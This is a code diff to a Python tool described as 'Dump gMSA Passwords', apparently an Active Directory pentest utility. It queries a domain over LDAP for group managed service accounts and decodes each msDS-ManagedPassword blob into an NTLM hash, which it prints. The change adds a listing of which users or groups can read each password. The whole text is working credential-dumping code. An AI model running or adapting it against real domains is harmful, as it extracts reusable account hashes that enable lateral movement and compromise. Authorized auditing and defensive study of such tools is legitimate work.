@@ -2,8 +2,9 @@
 from ldap3 import ALL, Server, Connection, NTLM, SASL, KERBEROS, extend, SUBTREE
 import argparse
 import binascii
-from structure import Structure
 from Cryptodome.Hash import MD4
+from impacket.ldap.ldaptypes import ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, LDAP_SID, SR_SECURITY_DESCRIPTOR
+from impacket.structure import Structure
 import sys
 
 parser = argparse.ArgumentParser(description='Dump gMSA Passwords')
@@ -77,22 +78,24 @@ def main():
     else:
         conn = Connection(server, authentication=SASL, sasl_mechanism=KERBEROS, auto_bind=True)
     conn.start_tls()
-    success = conn.search(base_creator(args.domain), '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword'])
+    success = conn.search(base_creator(args.domain), '(&(ObjectClass=msDS-GroupManagedServiceAccount))', search_scope=SUBTREE, attributes=['sAMAccountName','msDS-ManagedPassword','msDS-GroupMSAMembership'])
     
     if success:
         for entry in conn.entries:
-            try:
                 sam = entry['sAMAccountName'].value
-                data = entry['msDS-ManagedPassword'].raw_values[0]
-                blob = MSDS_MANAGEDPASSWORD_BLOB()
-                blob.fromString(data)
-                hash = MD4.new ()
-                hash.update (blob['CurrentPassword'][:-2])
-                passwd = binascii.hexlify(hash.digest()).decode("utf-8")
-                userpass = sam + ':::' + passwd
-                print(userpass)
-            except:
-                continue
+                print('Users or groups who can read password for '+sam+':')
+                for dacl in SR_SECURITY_DESCRIPTOR(data=entry['msDS-GroupMSAMembership'].raw_values[0])['Dacl']['Data']:
+                    conn.search(base_creator(args.domain), '(&(objectSID='+dacl['Ace']['Sid'].formatCanonical()+'))', attributes=['sAMAccountName'])
+                    print(' > ' + conn.entries[0]['sAMAccountName'].value)
+                if entry['msDS-ManagedPassword']:
+                    data = entry['msDS-ManagedPassword'].raw_values[0]
+                    blob = MSDS_MANAGEDPASSWORD_BLOB()
+                    blob.fromString(data)
+                    hash = MD4.new ()
+                    hash.update (blob['CurrentPassword'][:-2])
+                    passwd = binascii.hexlify(hash.digest()).decode("utf-8")
+                    userpass = sam + ':::' + passwd
+                    print(userpass)
 
 if __name__ == "__main__":
     main()
